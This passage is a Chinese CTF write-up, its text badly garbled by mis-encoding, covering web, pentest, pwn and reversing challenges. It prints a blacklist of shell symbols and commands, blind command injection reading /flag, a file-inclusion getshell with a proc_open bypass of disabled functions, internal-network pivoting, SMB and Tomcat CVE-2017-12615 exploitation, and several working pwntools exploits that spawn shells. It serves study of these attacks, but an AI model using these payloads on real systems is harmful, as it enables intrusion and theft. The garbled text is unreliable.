\u0026#34;rm\u0026#34;, \u0026#34;echo\u0026#34;}; public User(long id, String username, String cmd, Timestamp time) { this.id = id; this.username = username; this.cmd = cmd; this.time = time; } private void readObject(ObjectInputStream in) throws Exception { in.defaultReadObject(); if (checkCmd(this.cmd).booleanValue()) { String cmd_pre = \u0026#34;sleep $(\u0026#34;; String cmd_suf = \u0026#34;)\u0026#34;; String exec = cmd_pre + this.cmd + cmd_suf; String[] cmds = { SysUtil.asciiToString(\u0026#34;47,98,105,110,47,98,97,115,104\u0026#34;), SysUtil.asciiToString(\u0026#34;45,99\u0026#34;), exec }; SysUtil.execCmd(cmds); } } public Boolean checkCmd(String cmd) { for (String symbol : BLACKLIST) { if (cmd.contains(symbol)) { return Boolean.valueOf(false); } } return Boolean.valueOf(true); } cmdsè½¬æ¢ä¸ºasciiå°±æ˜¯\nString[] cmds = { \u0026#34;/bin/bash\u0026#34;, \u0026#34;-c\u0026#34;, exec }; execå°±æ˜¯ä¼ å…¥çš„cmdï¼Œç„¶è€Œè¿™é‡Œåˆ©ç”¨ç‚¹æ¯”è¾ƒå°´å°¬ï¼Œå› ä¸ºæˆ‘ä»¬ä¼ å…¥çš„ä»£ç æ˜¯è¢«execæ˜¯è¢«sleep $()ç»™åŒ…å›´èµ·æ¥çš„ï¼Œè€Œå…³é”®çš„ä¸€äº›ç»•è¿‡éƒ½è¿›äº†é»‘åå•\nprivate static final String[] BLACKLIST = { \u0026#34;$\u0026#34;, \u0026#34;{\u0026#34;, \u0026#34;}\u0026#34;, \u0026#34;`\u0026#34;, \u0026#34;base64\u0026#34;, \u0026#34;\u0026amp;\u0026#34;, \u0026#34;;\u0026#34;, \u0026#34;||\u0026#34;, \u0026#34;%\u0026#34;, \u0026#34;(\u0026#34;, \u0026#34;)\u0026#34;, \u0026#34;rm\u0026#34;, \u0026#34;echo\u0026#34;}; è¿™é‡Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨å‘½ä»¤æ‰§è¡Œç›²æ³¨çš„å½¢å¼è¿›è¡Œå¯¹flagçŒœè§£ã€‚ç¨åæˆ‘ä¼šè¯¦ç»†å†™ä¸€ç¯‡æ–‡ç« è®²è§£å‘½ä»¤ç›²æ³¨çš„æ–¹å¼ã€‚\næˆ‘ä»¬å¯ä»¥é‡‡ç”¨cat /flag | cut -c 1 | tr N 10è¿™æ ·çš„å½¢å¼å¯¹flagè¿›è¡ŒçŒœè§£ã€‚\n cat /flagè¯»å–/flagä¸­çš„å†…å®¹ cut -c 1æˆªå–ç¬¬ä¸€ä¸ªå­—ç¬¦ tr N 10ç”¨10æ¥ä»£æ›¿flagä¸­çš„å­—æ¯N  æ‰€ä»¥ï¼Œé€šè¿‡æŠŠflagä¸­çš„å†…å®¹è¯»å‡ºæ¥ä¹‹åï¼Œç”¨å­—æ¯ä»£æ›¿è¿›è¡Œsleepï¼Œå¦‚æœçŒœè§£å¯¹çš„è¯ï¼Œå¹¶ä¸”æ’é™¤ç½‘ç»œåŸå› ï¼Œé¡µé¢ä¼šå»¶ç¼“5sæ‰è¿”å›ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªç‰¹æ€§æŠŠflagçŒœè§£å‡ºæ¥ã€‚\nå…¶å®è¿™é‡Œè®¾ç½®å¾—ä¸å¤ªå¥½ï¼Œåº”è¯¥æŠŠflagæ”¹æˆå…¨è‹±æ–‡æ¯”è¾ƒå¥½ä¸€äº›å¾—åˆ°flagã€‚ä¹Ÿå¯ä»¥ç”¨burp intruderæ¥çŒœè§£ã€‚\nWeb4 Pentest é¦–å…ˆå‘ç° url æœ‰æ–‡ä»¶è¯»å–ï¼Œåˆ©ç”¨\nhttp://localhost:8004/index.php?action=php://filter/read=convert.base64-encode/resource=index.php è¯»å–æºç ï¼Œæ‰«ç›®å½•å¾—åˆ°\n[22:52:52] 301 - 311B - /img -\u0026gt; http://localhost:8004/img/ [22:52:52] 302 - 104B - /index.php -\u0026gt; /index.php?action=show.php [22:52:52] 200 - 169B - /INDEX.PHP [22:52:52] 200 - 169B - /index.PHP [22:52:52] 302 - 104B - /index.php/login/ -\u0026gt; /index.php?action=show.php [22:52:52] 200 - 83KB - /info.php [22:52:55] 403 - 299B - /server-status [22:52:55] 403 - 300B - /server-status/ [22:52:56] 200 - 772B - /upload.php Task Completed ç›´æ¥æŸ¥çœ‹ upload.php çš„æºç \n\u0026lt;?php $addr = md5(\u0026#34;hac425\u0026#34;.$_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;]); $sandbox = \u0026#39;/var/www/html/\u0026#39; .$addr ; @mkdir($sandbox); @chdir($sandbox); $is_upload = false; $msg = null; $UPLOAD_ADDR = \u0026#34;\u0026#34;; if (isset($_POST[\u0026#39;submit\u0026#39;])){ // è·å¾—ä¸Šä¼ æ–‡ä»¶çš„åŸºæœ¬ä¿¡æ¯ï¼Œæ–‡ä»¶åï¼Œç±»å‹ï¼Œå¤§å°ï¼Œä¸´æ—¶æ–‡ä»¶è·¯å¾„  $filename = $_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;name\u0026#39;]; $filetype = $_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;type\u0026#39;]; $tmpname = $_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;tmp_name\u0026#39;]; $target_path=$UPLOAD_ADDR.basename($filename); // è·å¾—ä¸Šä¼ æ–‡ä»¶çš„æ‰©å±•å  $fileext= substr(strrchr($filename,\u0026#34;.\u0026#34;),1); //åˆ¤æ–­æ–‡ä»¶åç¼€ä¸ç±»å‹ï¼Œåˆæ³•æ‰è¿›è¡Œä¸Šä¼ æ“ä½œ  if(($fileext == \u0026#34;jpg\u0026#34;) \u0026amp;\u0026amp; ($filetype==\u0026#34;image/jpeg\u0026#34;)){ if(move_uploaded_file($tmpname,$target_path)) { //ä½¿ç”¨ä¸Šä¼ çš„å›¾ç‰‡ç”Ÿæˆæ–°çš„å›¾ç‰‡  $im = imagecreatefromjpeg($target_path); if($im == false){ $msg = \u0026#34;è¯¥æ–‡ä»¶ä¸æ˜¯jpgæ ¼å¼çš„å›¾ç‰‡ï¼\u0026#34;; }else{ //ç»™æ–°å›¾ç‰‡æŒ‡å®šæ–‡ä»¶å  srand(time()); $newfilename = strval(rand()).\u0026#34;.jpg\u0026#34;; $newimagepath = $UPLOAD_ADDR.$newfilename; imagejpeg($im,$newimagepath); //æ˜¾ç¤ºäºŒæ¬¡æ¸²æŸ“åçš„å›¾ç‰‡ï¼ˆä½¿ç”¨ç”¨æˆ·ä¸Šä¼ å›¾ç‰‡ç”Ÿæˆçš„æ–°å›¾ç‰‡ï¼‰  $img_path = $UPLOAD_ADDR.$newfilename; unlink($target_path); $is_upload = true; } } else { $msg = \u0026#34;ä¸Šä¼ å¤±è´¥ï¼\u0026#34;; } }else if(($fileext == \u0026#34;png\u0026#34;) \u0026amp;\u0026amp; ($filetype==\u0026#34;image/png\u0026#34;)){ if(move_uploaded_file($tmpname,$target_path)) { //ä½¿ç”¨ä¸Šä¼ çš„å›¾ç‰‡ç”Ÿæˆæ–°çš„å›¾ç‰‡  $im = imagecreatefrompng($target_path); if($im == false){ $msg = \u0026#34;è¯¥æ–‡ä»¶ä¸æ˜¯pngæ ¼å¼çš„å›¾ç‰‡ï¼\u0026#34;; }else{ //ç»™æ–°å›¾ç‰‡æŒ‡å®šæ–‡ä»¶å  srand(time()); $newfilename = strval(rand()).\u0026#34;.png\u0026#34;; $newimagepath = $UPLOAD_ADDR.$newfilename; imagepng($im,$newimagepath); //æ˜¾ç¤ºäºŒæ¬¡æ¸²æŸ“åçš„å›¾ç‰‡ï¼ˆä½¿ç”¨ç”¨æˆ·ä¸Šä¼ å›¾ç‰‡ç”Ÿæˆçš„æ–°å›¾ç‰‡ï¼‰  $img_path = $UPLOAD_ADDR.$newfilename; unlink($target_path); $is_upload = true; } } else { $msg = \u0026#34;ä¸Šä¼ å¤±è´¥ï¼\u0026#34;; } }else if(($fileext == \u0026#34;gif\u0026#34;) \u0026amp;\u0026amp; ($filetype==\u0026#34;image/gif\u0026#34;)){ if(move_uploaded_file($tmpname,$target_path)) { //ä½¿ç”¨ä¸Šä¼ çš„å›¾ç‰‡ç”Ÿæˆæ–°çš„å›¾ç‰‡  $im = imagecreatefromgif($target_path); if($im == false){ $msg = \u0026#34;è¯¥æ–‡ä»¶ä¸æ˜¯gifæ ¼å¼çš„å›¾ç‰‡ï¼\u0026#34;; }else{ //ç»™æ–°å›¾ç‰‡æŒ‡å®šæ–‡ä»¶å  srand(time()); $newfilename = strval(rand()).\u0026#34;.gif\u0026#34;; $newimagepath = $UPLOAD_ADDR.$newfilename; imagegif($im,$newimagepath); //æ˜¾ç¤ºäºŒæ¬¡æ¸²æŸ“åçš„å›¾ç‰‡ï¼ˆä½¿ç”¨ç”¨æˆ·ä¸Šä¼ å›¾ç‰‡ç”Ÿæˆçš„æ–°å›¾ç‰‡ï¼‰  $img_path = $UPLOAD_ADDR.$newfilename; unlink($target_path); $is_upload = true; } } else { $msg = \u0026#34;ä¸Šä¼ å¤±è´¥ï¼\u0026#34;; } }else{ $msg = \u0026#34;åªå…è®¸ä¸Šä¼ åç¼€ä¸º.jpg|.png|.gifçš„å›¾ç‰‡æ–‡ä»¶ï¼\u0026#34;; } } ?\u0026gt;\u0026lt;div id=\u0026#34;upload_panel\u0026#34;\u0026gt; \u0026lt;ol\u0026gt; \u0026lt;li\u0026gt; \u0026lt;h3\u0026gt;è¯´æ˜\u0026lt;/h3\u0026gt; \u0026lt;p\u0026gt;ç»™è‡ªå·±ç•™çš„å›¾ç‰‡ä¸Šä¼ åŒº\u0026lt;/p\u0026gt; \u0026lt;/li\u0026gt; \u0026lt;li\u0026gt; \u0026lt;h3\u0026gt;ä¸Šä¼ åŒº\u0026lt;/h3\u0026gt; \u0026lt;form enctype=\u0026#34;multipart/form-data\u0026#34; method=\u0026#34;post\u0026#34;\u0026gt; \u0026lt;p\u0026gt;è¯·é€‰æ‹©è¦ä¸Šä¼ çš„å›¾ç‰‡ï¼š\u0026lt;p\u0026gt; \u0026lt;input class=\u0026#34;input_file\u0026#34; type=\u0026#34;file\u0026#34; name=\u0026#34;upload_file\u0026#34;/\u0026gt; \u0026lt;input class=\u0026#34;button\u0026#34; type=\u0026#34;submit\u0026#34; name=\u0026#34;submit\u0026#34; value=\u0026#34;ä¸Šä¼ \u0026#34;/\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;div id=\u0026#34;msg\u0026#34;\u0026gt; \u0026lt;?php if($msg != null){ echo \u0026#34;æç¤ºï¼š\u0026#34;.$msg; } ?\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div id=\u0026#34;img\u0026#34;\u0026gt; \u0026lt;?php if($is_upload){ $img_path = $addr .\u0026#39;/\u0026#39;.$img_path; echo \u0026#39;\u0026lt;img src=\u0026#34;\u0026#39;.$img_path.\u0026#39;\u0026#34; width=\u0026#34;250px\u0026#34; /\u0026gt;\u0026#39;; } ?\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/li\u0026gt; \u0026lt;?php if($_GET[\u0026#39;action\u0026#39;] == \u0026#34;show_code\u0026#34;){ include \u0026#39;show_code.php\u0026#39;; } ?\u0026gt; \u0026lt;/ol\u0026gt; \u0026lt;/div\u0026gt; çœ‹æºç å¯ä»¥å‘ç°å›¾ç‰‡ä¸Šä¼ åç»è¿‡äº†äºŒæ¬¡æ¸²æŸ“ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥å‘ç°å…ˆæ‰§è¡Œäº†move_uploaded_fileï¼Œæ‰€ä»¥æ–‡ä»¶æ˜¯ä¸Šä¼ æˆåŠŸäº†çš„ï¼Œç»“åˆæ–‡ä»¶åŒ…å«æ¼æ´ getshell ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥çœ‹åˆ° info.php é‡Œé¢çš„ä¿¡æ¯\ndisable_functions passthru,exec,system,chroot,chgrp,chown,shell_exec,proc_get_status,popen,ini_alter,ini_restore,dl,openlog,syslog,readlink,symlink,popepassthru å‘ç°å¤§éƒ¨åˆ†çš„æ‰§è¡Œå‡½æ•°éƒ½è¢«disableäº†ï¼Œä½†æ˜¯æˆ‘ä»¬è¿˜å¯ä»¥ç”¨proc_openï¼Œä¹Ÿå¯ä»¥å‚è€ƒ\næ— éœ€sendmailï¼šå·§ç”¨LD_PRELOADçªç ´disable_functions\n\u0026lt;?php $command=\u0026#34;id\\npwd\\n\u0026#34;; $descriptorspec = array( 0 =\u0026gt; array(\u0026#39;pipe\u0026#39;, \u0026#39;r\u0026#39;), 1 =\u0026gt; array(\u0026#39;pipe\u0026#39;, \u0026#39;w\u0026#39;), 2 =\u0026gt; array(\u0026#39;pipe\u0026#39;, \u0026#39;w\u0026#39;) ); $resource = proc_open($command, $descriptorspec, $pipes, null, $_ENV); if (is_resource($resource)) { fwrite($pipes[0], \u0026#34;pwd\\n\u0026#34;); $stdin = $pipes[0]; $stdout = $pipes[1]; $stderr = $pipes[2]; while (! feof($stdout)) { $retval .= fgets($stdout,1024); } while (! feof($stderr)) { $error .= fgets($stderr); } fwrite($pipes[0], \u0026#34;pwd\\n\u0026#34;); $stdout = $pipes[1]; $stderr = $pipes[2]; while (! feof($stdout)) { $retval .= fgets($stdout,1024); } while (! feof($stderr)) { $error .= fgets($stderr); } fclose($stdin); fclose($stdout); fclose($stderr); $exit_code = proc_close($resource); } if (! empty($error)) throw new Exception($error); else echo $retval; ?\u0026gt;ç„¶åæˆ‘ä»¬åœ¨é¦–é¡µå¾—åˆ°é‚£ä¸ª img è·¯å¾„ï¼Œåˆ©ç”¨æ–‡ä»¶åŒ…å«ï¼Œå¯ä»¥å‘ç°æˆåŠŸæ‰§è¡Œå‘½ä»¤ã€‚\n \næ¥ä¸‹æ¥ç®€åŒ–ä¸€ä¸‹æ“ä½œï¼Œæˆ‘å°±ç›´æ¥æŠŠé‚£äº› php disable å»æ‰ã€‚ç„¶åæˆ‘ä»¬å‘ç°æœ‰ä¸ªæ–‡ä»¶\n \n \nä¼  ew + busyboxï¼Œæ‹¿use auxiliary/scanner/portscan/tcpï¼Œå¾—åˆ° 172.20.0.3 è¿™ä¸ª ip ä¸Šæœ‰ç«¯å£å¼€ç€\n \næŒ‚å¥½ ew ä¹‹åï¼Œæˆ‘ä»¬å°è¯•ç”¨ smbclient æ¥è¿æ¥å†…ç½‘çš„ samba æœåŠ¡ï¼ˆè¿™é‡Œç¬¬äºŒå¤©æ¥å¼„äº†ï¼Œä¹‹å‰åˆèµ·äº†ä¸€ä¸ª container ï¼Œæ‰€ä»¥ ip å˜æˆäº† 172.21.0.3\nè¿™é‡Œåˆ—ä¸€ä¸‹ smbclient å¸¸ç”¨çš„å‘½ä»¤\n1.åˆ—å‡ºæŸä¸ªIPåœ°å€æ‰€æä¾›çš„å…±äº«æ–‡ä»¶å¤¹ smbclient -L //198.168.0.1/ -U username%password 2.åƒFTPå®¢æˆ·ç«¯ä¸€æ ·ä½¿ç”¨smbclient smbclient //192.168.0.1/tmp -U username%password æ‰§è¡Œsmbclientå‘½ä»¤æˆåŠŸåï¼Œè¿›å…¥smbclientç¯å¢ƒï¼Œå‡ºç°æç¤ºç¬¦ï¼š smb:/\u0026gt; è¿™æ—¶è¾“å…¥ï¼Ÿä¼šçœ‹åˆ°æ”¯æŒçš„å‘½ä»¤ è¿™é‡Œæœ‰è®¸å¤šå‘½ä»¤å’Œftpå‘½ä»¤ç›¸ä¼¼ï¼Œå¦‚cd ã€lcdã€getã€megtã€putã€mputç­‰ã€‚é€šè¿‡è¿™äº›å‘½ä»¤ï¼Œæˆ‘ä»¬å¯ä»¥è®¿é—®è¿œç¨‹ä¸»æœºçš„å…±äº«èµ„æºã€‚ 3,ç›´æ¥ä¸€æ¬¡æ€§ä½¿ç”¨smbclientå‘½ä»¤ smbclient -c \u0026#34;ls\u0026#34; //192.168.0.1/tmp -U username%password å’Œ smbclient //192.168.0.1/tmp -U username%password smb:/\u0026gt;ls åŠŸèƒ½ä¸€æ ·çš„ ä¾‹ï¼Œåˆ›å»ºä¸€ä¸ªå…±äº«æ–‡ä»¶å¤¹ smbclient -c \u0026#34;mkdir share1\u0026#34; //192.168.0.1/tmp -U username%password å¦‚æœç”¨æˆ·å…±äº«//192.168.0.1/tmpçš„æ–¹å¼æ˜¯åªè¯»çš„ï¼Œä¼šæç¤º NT_STATUS_ACCESS_DENIED making remote directory /share1 4ï¼Œé™¤äº†ä½¿ç”¨smbclientï¼Œè¿˜å¯ä»¥é€šè¿‡mountå’ŒsmbcountæŒ‚è½½è¿œç¨‹å…±äº«æ–‡ä»¶å¤¹ æŒ‚è½½ mount -t cifs -o username=administrator,password=123456 //192.168.0.1/tmp /mnt/tmp å–æ¶ˆæŒ‚è½½ umount /mnt/tmp è‹¥å‡ºç°äº†ä¸‹å›¾çš„é”™è¯¯ï¼Œåˆ™éœ€è¦åŠ ä¸Š-m SMB2\n \n \nå¯ä»¥çœ‹åˆ°æŒ‚è½½äº†ä¸€ä¸ª www ç›®å½•ï¼Œæ¥ç€è¿›å…¥äº¤äº’æ¨¡å¼\n \nå¾—åˆ°ç¬¬ä¸€éƒ¨åˆ†çš„ flag\nç„¶åå‘ç°åœ¨ 172.21.0.4 ä¸Šå¼€æ”¾ç€ 8080 ç«¯å£\n \næŒ‚ä»£ç†è¯·æ±‚ 172.21.0.4:8080 å‘ç°æ˜¯ Apache Tomcat/7.0.79\n \nè®¿é—® manager å°è¯•äº†å¼±å¯†ç æ— æœï¼Œå°è¯• CVE-2017-12615\nç›´æ¥ä¸Š msf\n \n \n \næˆåŠŸæ‹¿åˆ°ä¸¤æ®µ flag\nPwn overflow ç®€å•æ ˆæº¢å‡ºï¼Œç”¨äº†éšæœºæ•°æ¨¡æ‹Ÿäº†canaryï¼Œæœ¬åœ°ç”Ÿæˆéšæœºæ•°å³å¯ã€‚\nexp:\n#/usr/bin/env python from pwn import * from ctypes import * libc = cdll.LoadLibrary(\u0026quot;libc.so.6\u0026quot;) p = process('./overflow') ret = 0x80485BD t = libc.time(0) libc.srand(t) random = libc.rand() p.recvline() payload = 'a'*0x20 + p32(random) + 'a'*0xc + p32(ret) #gdb.attach(p) p.sendline(payload) print p.recvline() kvm ç®€å•çš„kvmï¼Œåªéœ€è¦åœ¨vmé‡Œé¢æ‰§è¡Œç«¯å£å†™æ“ä½œå³å¯ã€‚\nexp:\n#/usr/bin/env python from pwn import * p = process('./kvm') p.recvuntil(\u0026quot;execute: \\n\u0026quot;) code = asm(''' movabs rax, 0x67616c66 push 4 pop rcx mov edx, 0x100 OUT: out dx, al shr rax, 8 loop OUT ''', arch = 'amd64') p.sendline(code) p.recvuntil(\u0026quot;execute again: \\n\u0026quot;) #gdb.attach(p) p.sendline(asm(shellcraft.amd64.linux.sh(), arch = 'amd64')) p.interactive() password_checker snprintf è¯¯ç”¨ï¼Œ å®ƒè¿”å›çš„æ˜¯æ ¼å¼åŒ–è§£æåå½¢æˆçš„å­—ç¬¦ä¸²çš„é•¿åº¦ï¼ˆåŠæœŸæœ›å†™å…¥ç›®æ ‡ç¼“å†²åŒºçš„é•¿åº¦ï¼‰ï¼Œè€Œä¸æ˜¯å®é™…å†™å…¥ ç›®æ ‡ç¼“å†²åŒºçš„å†…å­˜é•¿åº¦ã€‚\n int off = snprintf(buf, 0x100, \u0026quot;name:%s\u0026amp;\u0026quot;, input); ........................... ........................... ........................... // off å¯èƒ½ä¼šæ¯”è¾ƒå¤§ï¼Œå‡ºç°è¶Šç•Œå†™ off = snprintf(buf + off, 0x100 - off, \u0026quot;pwd:%s\u0026quot;, input); æ‰€ä»¥åˆ©ç”¨ snprintf è®© off ç§»åŠ¨åˆ°è¿”å›åœ°å€çš„ä½ç½®ï¼Œ ç„¶åå†™è¿”å›åœ°å€ä¸º getshell å‡½æ•°çš„åœ°å€ã€‚\nå…·ä½“çœ‹ exp å’Œæºç \nexp:\n#!/usr/bin/python # -*- coding: UTF-8 -*- from pwn import * context.terminal = ['tmux', 'splitw', '-h'] context.log_level = \u0026quot;debug\u0026quot; binary_path = \u0026quot;../dist/pwn\u0026quot; # p = process(binary_path) p = remote(\u0026quot;172.17.0.2\u0026quot;, 20000) p.recvuntil(\u0026quot;welcome.....\u0026quot;) # è®¡ç®—å‡ºéœ€è¦è¾“å…¥çš„å­—ç¬¦ä¸²é•¿åº¦ï¼Œè®© off + buf èƒ½å¤Ÿå†™åˆ°è¿”å›åœ°å€ # è¿˜è¦å»æ‰ pwd: è¿™ 4 ä¸ª å­—èŠ‚ payload = \u0026quot;a\u0026quot; * (0x10c+4-4-2-4) p.send(payload) # gdb.attach(p,\u0026quot;\u0026quot;\u0026quot; # bp 0x0804873B # c # \u0026quot;\u0026quot;\u0026quot;) # pause() payload = p32(0x08048674) p.sendline(payload) p.interactive() type_confusion ç±»å‹æ··æ·†ï¼Œå¯ä»¥å…ˆé‡Šæ”¾ä¸€ä¸ª c1ç±»çš„ obj, ç„¶ååˆ†é…ä¸€ä¸ª c2 ç±»çš„ obj, ç„¶ååˆ©ç”¨ see c1 obj çš„åŠŸèƒ½è°ƒç”¨è™šå‡½æ•°ï¼Œä¼šè°ƒç”¨ c2 çš„è™šå‡½æ•°ï¼Œc2 çš„ç›¸åº”è™šå‡½æ•°çš„ä½œç”¨å°±æ˜¯ system(\u0026ldquo;sh)\nint c2::dump() { system(\u0026quot;sh\u0026quot;); } exp:\n#!/usr/bin/python # -*- coding: UTF-8 -*- from pwn import * context.terminal = ['tmux', 'splitw', '-h'] context.log_level = \u0026quot;debug\u0026quot; binary_path = \u0026quot;../dist/pwn\u0026quot; # p = process(binary_path) p = remote(\u0026quot;172.17.0.2\u0026quot;, 20000) p.recvuntil(\u0026quot;Your choice: \u0026quot;) p.sendline(\u0026quot;2\u0026quot;) p.recvuntil(\u0026quot;Index: \u0026quot;) p.sendline(\u0026quot;0\u0026quot;) p.recvuntil(\u0026quot;Your choice: \u0026quot;) p.sendline(\u0026quot;100\u0026quot;) p.recvuntil(\u0026quot;Your choice: \u0026quot;) p.sendline(\u0026quot;1\u0026quot;) p.recvuntil(\u0026quot;Index: \u0026quot;) p.sendline(\u0026quot;0\u0026quot;) p.interactive() å…·ä½“çœ‹ exp å’Œæºç \nRev stupid_contract_challenge[rev] ç®€å•solidityé€†å‘ï¼Œæºç å¦‚ä¸‹\npragma solidity ^0.4.25; contract stupidChallenge{ bytes32 seed = 0xaaa0adabb79fb8b9bca5a8938fa3a2b8415250476c705b525f5f565d5456124e; function generateFlag() public returns(bytes){ bytes memory finalFlag = new bytes(seed.length); uint i; for(i = 0;i\u0026lt;seed.length/2;i++) { finalFlag[i]=seed[i]^0xcc; } for(;i\u0026lt;seed.length;i++) { finalFlag[i]=seed[i]^0x33; } return finalFlag; } } ç›´æ¥æŠŠå­—èŠ‚ç æ‰” https://ethervm.io/decompile å³å¯\nvariant_of_cat æ™ºèƒ½åˆçº¦ï¼Œæ•´æ•°ä¸‹æº¢ å…ˆè°ƒç”¨fightAsuriMonsterä½¿å¾—æ”»å‡»åŠ›ä¸‹æº¢ï¼Œå†æ¬¡è°ƒç”¨fightBosså³å¯\nSTG TouHou æ˜¯ä¸€ä¸ªå½»å¤´å½»å°¾çš„è½¦ä¸‡æ¸¸æˆå‘¢ã€‚\næ­£å¸¸é€šå…³ é€šå…³æ¸¸æˆï¼Œä¼šæŠŠflagæ‰“å°åœ¨å±å¹•ä¸Š\né€†å‘åˆ†æ è¿™ä¸ªé¢˜ç›®ä¼šå‘ŠçŸ¥å¤§å®¶è¿™ä¸ªç¨‹åºå«åšå››åœ£é¾™ç¥å½•ï¼Œå…¶å®æ˜¯å¯ä»¥ä»githubä¸Šæ‰¾åˆ°æºç çš„ã€‚Revçš„é¢˜ç›®æ‹¿åˆ°äº†æºç ï¼Œé‚£åŸºæœ¬ä¸Šå°±åšå‡ºæ¥äº†ã€‚å½“ç„¶æºä»£ç è‚¯å®šæ²¡æœ‰flagç›¸å…³çš„é€»è¾‘ï¼Œå¯ä»¥ç»“åˆæºä»£ç å¯¹ç¨‹åºè¿›è¡Œå®¡è®¡ã€‚ é¦–å…ˆé€†å‘æ—¥å¸¸æœç´¢flagå­—ç¬¦ä¸²ï¼Œä¼šå‘ç°å¦‚ä¸‹çš„å‡½æ•°:\nvoid sub_4308D0() { int v0; // eax  if ( dword_D0CA74 == 1 ) { v0 = sub_40E039(255, 255, 255); sub_40D837(0, 40, v0, \u0026#34;Flag:%s\u0026#34;, (unsigned int)\u0026amp;byte_D0CA78); } } è¿™ä¸ªFlagå¾ˆæ˜¾ç„¶æ˜¯åˆ»æ„æ‰“å°çš„ï¼Œé‚£ä¹ˆè¿½è¸ªä¸€ä¸‹è¿™ä¸ªbyte_D0CA78\nsigned int __cdecl sub_430730(char a1) { signed int result; // eax  char v2; // STD7_1  signed int i; // [esp+E8h] [ebp-8h]  signed int j; // [esp+E8h] [ebp-8h]  for ( i = 0; i \u0026lt; 54; ++i ) byte_AEE308[i] -= a1; for ( j = 0; ; j += 2 ) { result = j; if ( j \u0026gt;= 54 ) break; v2 = 16 * trans2num(byte_AEE308[j]); byte_D0CA78[j / 2] = trans2num(byte_AEE309[j]) + v2; } dword_D0CA74 = 1; return result; } ä¼šæ‰¾åˆ°è¿™ä¸ªå‡½æ•°ï¼Œå¯ä»¥çœ‹åˆ°è¿™é‡Œåˆå­˜å‚¨äº†ä¸€ä¸ªå…¨å±€å˜é‡ã€‚è¿™é‡Œçš„è¿ç®—ç›¸å½“äºæ˜¯å°†ä¸€ä¸ªæ•°å­—åˆ†æˆäº†é«˜4bitå’Œä½4bitç„¶åè¿›è¡Œåˆå¹¶å¤„ç†ï¼Œé‚£ä¹ˆæˆ‘ä»¬ç»§ç»­å›æº¯ï¼Œæ£€æŸ¥è¿™ä¸ªbyte_AEE308çš„æ¥å†ï¼Œä¼šæ‰¾åˆ°å¦ä¸€æ®µçš„ç¨‹åºé€»è¾‘:\nsigned int __cdecl sub_430850(char a1) { signed int result; // eax  signed int i; // [esp+DCh] [ebp-8h]  for ( i = 0; ; ++i ) { result = i; if ( i \u0026gt;= 54 ) break; byte_AEE308[i] ^= a1; } return result; } è·Ÿè¸ªè°ƒç”¨å…³ç³»ï¼Œä¼šå‘ç°è¿™ä¸¤ä¸ªå‡½æ•°æ˜¯ç”±åŒä¸€ä¸ªå‡½æ•°è°ƒç”¨çš„:\nsigned int __cdecl sub_430960(int a1, char a2) { signed int result; // eax  if ( a1 == 1 ) return sub_405696(a2); if ( a1 == 2 ) result = sub_402A09(a2); return result; } è·Ÿè¸ªåˆ°å¤–é¢ï¼Œå¯ä»¥çœ‹åˆ°è¿™æ ·çš„é€»è¾‘\nresult = dword_D0C03C++ + 1; if ( dword_D0C03C == 1 ) return sub_40A907(dword_D0C03C, 255); if ( dword_D0C03C == 2 ) result = sub_40A907(dword_D0C03C, 19); return result; ç»“åˆä¸œæ–¹ï¼ˆæ¸¸æˆé€»è¾‘ï¼ï¼‰ä¸€èˆ¬æ¥è¯´éƒ½æ˜¯å…ˆ1å2ï¼Œæ‰€ä»¥æ˜¯å…ˆè°ƒç”¨å‰é¢é‚£ä¸ªé€»è¾‘åè°ƒç”¨åé¢çš„é€»è¾‘ã€‚äºæ˜¯æ ¹æ®è°ƒç”¨é¡ºåºï¼Œæˆ‘ä»¬èƒ½å¤Ÿå†™å‡ºè§£å¯†è„šæœ¬:\nimport codecs enc = [182,135,181,183,182,187,182,187,182,185,181,184,182,182,181,138,183,181,182,183,185,187,182,185,185,188,182,136,185,185,183,134,185,186,183,134,184,181,185,185,182,135,183,185,185,188,184,138,185,184,182,134,181,136 ] def dec_one(enc, num): for i in range(len(enc)): enc[i] ^= num def dec_two(enc, num): for i in range(len(enc)): enc[i] -= num tmp = 0 ans = \u0026#39;\u0026#39;.join(chr(c) for c in enc) print(codecs.decode(ans,\u0026#39;hex\u0026#39;)) if __name__ == \u0026#39;__main__\u0026#39;: dec_one(enc, 255) dec_two(enc, 19) # nuaactf{We1c0m3_2_G3nS0K4o} Middle é¢˜ç›®æ¥æºï¼šå› ä¸ºéš¾åº¦å®šä½æ˜¯ä¸­ç­‰æ‰€ä»¥å«è¿™ä¸ª\nåˆæ­¥å‡†å¤‡ å¯¹äºæƒ³è¦åšè¿™ä¸ªé¢˜ç›®çš„äººæ¥è¯´ï¼Œæƒ³å¿…ä¹Ÿæ˜¯æœ‰äº†ä¸€å®šçš„åŸºç¡€ã€‚æ¯”å¦‚è¯´é¦–å…ˆè¦è®¤å¾—è¿™ä¸ªç¨‹åºæ˜¯ä¸€ä¸ªELFæ–‡ä»¶æ˜¯Linuxä¸‹çš„å¯æ‰§è¡Œæ–‡ä»¶ä¹‹ç±»çš„ã€‚ï¼ˆå…¶å®æˆ‘ç¬¬ä¸€æ¬¡åšçš„æ—¶å€™å°±ä¸ä¼šè®¤è¿™ä¸ªï¼Œæ»‘ç¨½ï¼‰ é‚£ä¹ˆé€†å‘é¦–å…ˆæ— éå‡†å¤‡å‡ ä¸ªå·¥å…·\n é™æ€å·¥å…·ï¼šIDA åŠ¨æ€åˆ†æå·¥å…·ï¼šgdb ç¯å¢ƒï¼šUbuntu  é¦–å…ˆè¿è¡Œç¨‹åºï¼Œå‘ç°ç¨‹åºä¸¤ä¸ªè¡Œä¸ºï¼š\n è¾“å…¥nuaactf{.+}æ ¼å¼çš„å­—ç¬¦ä¸² å¦‚æœè¾“å…¥å®Œæˆï¼Œä¼šè®©æˆ‘ä»¬åšä¸€ä¸ªCè¯­è¨€çš„é¢˜ç›®  